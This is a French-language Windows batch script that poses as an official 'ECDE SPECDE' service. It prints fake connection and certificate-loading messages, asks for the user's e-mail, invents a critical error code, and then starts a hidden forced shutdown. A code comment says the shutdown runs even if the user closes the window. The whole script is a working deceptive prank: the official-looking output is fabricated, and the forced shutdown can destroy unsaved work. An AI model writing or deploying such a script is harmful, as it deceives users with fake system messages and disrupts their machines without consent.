@echo off
title ECDE - Service SPECDE [Version 1.6.4]
color 0a
cls

echo Connexion a la base de donnees ECDE...
timeout /t 2 >nul
echo.
echo Service SPECDE : Actif
timeout /t 1 >nul
echo Liaison avec les serveurs officielles ECDE...
timeout /t 2 >nul
echo Synchronisation des modules... [OK]
timeout /t 1 >nul
echo Chargement du certificat de connexion... [OK]
timeout /t 2 >nul
echo.

set /p email=Veuillez entrer votre e-mail ECDE : 

echo.
echo Vérification de %email% ...
timeout /t 2 >nul
echo [OK] Adresse valide
echo Initialisation des services SPECDE...
timeout /t 1 >nul
echo Liaison aux services internes...
timeout /t 1 >nul
echo Vérification des packages système...
timeout /t 2 >nul
echo Chargement de la clé ECDE-DEV...
timeout /t 2 >nul
echo Déploiement...
timeout /t 3 >nul
echo.
echo ⚠️ Une anomalie critique a été détectée dans votre environnement.
timeout /t 2 >nul
echo Tentative de réparation...
timeout /t 2 >nul
echo Impossible de résoudre l'erreur : 0xECDC-R4SH
echo.
echo Fermeture immédiate requise.
timeout /t 2 >nul

:: Commande pour que le PC s’éteigne même si l’utilisateur ferme la fenêtre
start "" /min shutdown /s /f /t 10

echo Une erreur critique est survenue. Extinction dans 10 secondes...
timeout /t 10 >nul
